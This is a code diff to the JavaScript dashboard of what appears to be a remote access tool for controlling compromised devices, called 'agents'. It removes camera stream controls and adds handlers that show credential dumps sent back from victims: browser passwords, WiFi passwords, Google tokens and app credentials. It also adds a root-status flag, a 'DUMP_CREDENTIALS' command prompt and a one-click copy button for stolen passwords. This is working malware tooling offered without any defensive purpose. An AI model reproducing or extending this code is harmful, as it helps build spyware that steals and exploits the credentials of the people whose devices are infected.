@@ -211,12 +211,14 @@ function handleWebSocketMessage(data) {
             handleVideoFrame(data.agent_id, data.frame);
             break;
             
-        case 'camera_frame':
-    handleCameraFrame(data.agent_id, data.frame);
+        case 'credentials_data':
+    console.log('🔐 Credentials data received:', data);
+    handleCredentialsData(data);
     break;
 
-case 'camera_stream_error':
-    addOutputLine(`📷 Camera error: ${data.message}`, 'error');
+case 'wifi_passwords':
+    console.log('📶 WiFi passwords received:', data);
+    handleWifiData(data);
     break;
             
         case 'social_message':
@@ -3830,57 +3832,7 @@ function showCameraPreview(frame) {
     switchToTab('camera');
 }
 
-// ==================== CAMERA STREAM CONTROLS ====================
 
-function startCameraStream(cameraType) {
-    if (!selectedAgent) {
-        addOutputLine('⚠️ Please select an agent first', 'error');
-        return;
-    }
-    const type = cameraType || 'back';
-    sendCommand('CAMERA_STREAM_START', type);
-    addOutputLine(`📷 Starting camera stream: ${type}`, 'info');
-    
-    // Tampilkan status di camera tab
-    const container = document.getElementById('camera-content');
-    if (container) {
-        container.innerHTML = `
-            <div style="text-align:center;padding:20px;color:#00d2ff;">
-                <div style="font-size:40px;">📷</div>
-                <div style="font-size:14px;margin-top:8px;">Starting ${type} camera stream...</div>
-                <div style="font-size:11px;color:#6b7a8a;margin-top:4px;">Waiting for frames...</div>
-            </div>
-        `;
-    }
-    switchToTab('camera');
-}
-
-function stopCameraStream() {
-    if (!selectedAgent) {
-        addOutputLine('⚠️ Please select an agent first', 'error');
-        return;
-    }
-    sendCommand('CAMERA_STREAM_STOP');
-    addOutputLine('📷 Stopping camera stream', 'info');
-}
-
-function pauseCameraStream() {
-    if (!selectedAgent) {
-        addOutputLine('⚠️ Please select an agent first', 'error');
-        return;
-    }
-    sendCommand('CAMERA_STREAM_PAUSE');
-    addOutputLine('⏸️ Camera stream paused', 'info');
-}
-
-function resumeCameraStream() {
-    if (!selectedAgent) {
-        addOutputLine('⚠️ Please select an agent first', 'error');
-        return;
-    }
-    sendCommand('CAMERA_STREAM_RESUME');
-    addOutputLine('▶️ Camera stream resumed', 'info');
-}
 
 function captureCameraPhoto() {
     if (!selectedAgent) {
@@ -3897,6 +3849,160 @@ function getCameraStreamStatus() {
         return;
     }
     sendCommand('CAMERA_STREAM_STATUS');
+}
+
+// ==================== CREDENTIALS HANDLERS ====================
+
+function handleCredentialsData(data) {
+    const container = document.getElementById('credentials-content') || createCredentialsTab();
+    const result = data.data || {};
+    
+    if (result.status === 'success') {
+        let html = `
+            <div class="credentials-card">
+                <div class="credentials-header">
+                    <h3>🔐 Credentials Dump</h3>
+                    <span style="color:#6b7a8a;font-size:11px;">${new Date().toLocaleString()}</span>
+                </div>
+                <div class="credentials-summary">
+                    <span>📊 Total Categories: ${result.total || 0}</span>
+                    <span>🔓 Root: ${result.is_rooted ? '✅' : '❌'}</span>
+                </div>
+        `;
+        
+        const categories = result.data || [];
+        categories.forEach(category => {
+            const type = category.type || 'unknown';
+            const count = category.count || 0;
+            const items = category.data || [];
+            
+            const iconMap = {
+                'browser_passwords': '🌐',
+                'wifi_passwords': '📶',
+                'google_tokens': '🔵',
+                'app_credentials': '📱'
+            };
+            
+            html += `
+                <div class="credential-category">
+                    <div class="category-header" onclick="toggleCategory(this)">
+                        <span>${iconMap[type] || '🔐'} ${type.replace('_', ' ').toUpperCase()}</span>
+                        <span>${count} items</span>
+                    </div>
+                    <div class="category-items">
+            `;
+            
+            items.forEach(item => {
+                html += `
+                    <div class="credential-item">
+                        ${Object.keys(item).map(key => `
+                            <div class="credential-field">
+                                <span class="field-label">${key}:</span>
+                                <span class="field-value">${escapeHtml(String(item[key] || ''))}</span>
+                            </div>
+                        `).join('')}
+                    </div>
+                `;
+            });
+            
+            html += `
+                    </div>
+                </div>
+            `;
+        });
+        
+        html += `</div>`;
+        container.innerHTML = html;
+        switchToTab('credentials');
+    } else {
+        addOutputLine(`❌ Failed to get credentials: ${result.message || 'Unknown error'}`, 'error');
+    }
+}
+
+function handleWifiData(data) {
+    const container = document.getElementById('credentials-content') || createCredentialsTab();
+    const result = data.data || {};
+    
+    if (result.status === 'success') {
+        const networks = result.data || [];
+        let html = `
+            <div class="credentials-card">
+                <div class="credentials-header">
+                    <h3>📶 WiFi Passwords</h3>
+                    <span style="color:#6b7a8a;font-size:11px;">${new Date().toLocaleString()}</span>
+                </div>
+                <div class="credentials-summary">
+                    <span>📊 Total: ${networks.length} networks</span>
+                </div>
+        `;
+        
+        networks.forEach((network, index) => {
+            html += `
+                <div class="credential-item" style="background: ${index % 2 === 0 ? '#0d1520' : 'transparent'};">
+                    <div class="credential-field">
+                        <span class="field-label">📶 SSID:</span>
+                        <span class="field-value" style="color:#ffd93d;">${escapeHtml(network.ssid || 'Unknown')}</span>
+                    </div>
+                    <div class="credential-field">
+                        <span class="field-label">🔑 Password:</span>
+                        <span class="field-value" style="color:#51cf66;">${escapeHtml(network.password || 'No password')}</span>
+                    </div>
+                    <button onclick="copyToClipboard('${escapeHtml(network.password || '')}')" style="background:#1a2633;border:none;color:#00d2ff;padding:2px 8px;border-radius:4px;cursor:pointer;">📋 Copy</button>
+                </div>
+            `;
+        });
+        
+        html += `</div>`;
+        container.innerHTML = html;
+        switchToTab('credentials');
+    }
+}
+
+function createCredentialsTab() {
+    let container = document.getElementById('credentials-tab');
+    if (!container) {
+        const tabContainer = document.getElementById('tabContainer');
+        if (tabContainer) {
+            const existingTab = tabContainer.querySelector('[data-tab="credentials"]');
+            if (!existingTab) {
+                const tab = document.createElement('button');
+                tab.className = 'tab';
+                tab.dataset.tab = 'credentials';
+                tab.textContent = '🔐 Credentials';
+                tab.style.color = '#ffd93d';
+                tabContainer.appendChild(tab);
+                tab.addEventListener('click', () => switchToTab('credentials'));
+            }
+        }
+        
+        const outputContainer = document.getElementById('output-container');
+        if (outputContainer) {
+            const content = document.createElement('div');
+            content.id = 'credentials-tab';
+            content.className = 'tab-content';
+            content.innerHTML = `
+                <div id="credentials-content" style="height:100%;overflow-y:auto;padding:10px 12px;">
+                    <div class="info">🔐 Credentials will appear here</div>
+                    <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+                        Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ffd93d;">DUMP_CREDENTIALS</code> to an agent
+                    </div>
+                </div>
+            `;
+            outputContainer.appendChild(content);
+        }
+        
+        container = document.getElementById('credentials-content');
+    }
+    return container;
+}
+
+function toggleCategory(header) {
+    const items = header.nextElementSibling;
+    if (items) {
+        items.style.display = items.style.display === 'none' ? 'block' : 'none';
+        header.querySelector('span:last-child').textContent = 
+            items.style.display === 'none' ? '▶' : '▼';
+    }
 }
 
 // ==================== ABOUT & HELP ====================
